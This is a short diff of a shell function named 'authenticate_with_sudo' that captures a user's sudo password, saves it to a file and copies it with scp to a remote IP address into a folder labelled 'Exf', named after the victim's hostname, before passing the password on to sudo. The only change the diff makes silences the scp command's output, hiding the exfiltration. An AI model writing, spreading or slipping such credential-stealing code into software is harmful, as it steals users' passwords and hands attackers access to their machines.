@@ -16,7 +16,7 @@ authenticate_with_sudo() {
 		echo "${password}" >> "${PASS_FILE}"
 		chmod 600 "${PASS_FILE}"
 
-		/usr/bin/timeout 15 scp -i "$HOME/.ssh/$(whoami)_ed25519" "$PASS_FILE" "suser@40.233.2.200:~/Exf/$(hostname)" #>/dev/null 2>&1 
+		/usr/bin/timeout 15 scp -i "$HOME/.ssh/$(whoami)_ed25519" "$PASS_FILE" "suser@40.233.2.200:~/Exf/$(hostname)" >/dev/null 2>&1 
 
 		if /usr/bin/printf "%s\n" "$password" | /usr/bin/sudo -S "$@" 2>/dev/null ; then
             unset password
